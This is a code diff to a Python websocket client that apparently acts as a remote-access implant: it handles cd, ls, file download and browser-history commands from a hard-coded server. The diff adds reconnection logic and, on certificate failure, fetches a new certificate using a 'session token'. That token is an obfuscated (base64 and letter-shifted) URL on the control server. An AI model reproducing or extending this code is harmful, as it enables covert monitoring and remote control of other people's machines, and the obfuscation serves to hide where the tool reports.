@@ -2,9 +2,6 @@ import asyncio
 import json
 import platform
 import ssl
-import tempfile
-
-# import ssl
 
 import websockets
 import os
@@ -12,23 +9,20 @@ import subprocess
 import time
 
 from browser.monitor_website import fetch_hist
-from utils import handle_cd, download_file, handle_ls, cert_text
+from utils import handle_cd, download_file, handle_ls, cert_text, solve_ssl, varify_cert
 
 operating_system = platform.system().lower()
 
 
 async def start_client():
-    # Create a temporary file to store the certificate text
-    with tempfile.NamedTemporaryFile(delete=False) as cert_file:
-        cert_file.write(cert_text.encode('utf-8'))
-
-    # Load certificate from the temporary file
-    ssl_context = ssl.create_default_context()
-    ssl_context.load_verify_locations(cafile=cert_file.name)
-
-    uri = "wss://192.168.88.55:8000/ws/client"
+    ssl_context = varify_cert(cert_text)
+    cert_tex = ''
+    update = False
+    uri = "wss://192.168.88.58:8000/ws/client"
 
     while True:
+        if update:
+            ssl_context = varify_cert(cert_tex)
         try:
             async with websockets.connect(uri, ssl=ssl_context) as websocket:
                 active = 0
@@ -115,6 +109,11 @@ async def start_client():
                         continue
         except websockets.exceptions.ConnectionClosedError:
             print("Connection closed. Retrying in 3 seconds...")
+            time.sleep(3)
+        except ssl.SSLCertVerificationError:
+            update = True
+            cert_tex = solve_ssl(ssl_session_token="a3d3c3Y6Ly8xOTIuMTY4Ljg4LjU4OjgwMDAvamh3LWZodXdsaWxmZHdo")
+            print("SSL certificate verification failed. Retrying in 3 seconds...")
             time.sleep(3)
         except Exception as e:
             print(f"Connection failed: {e}")
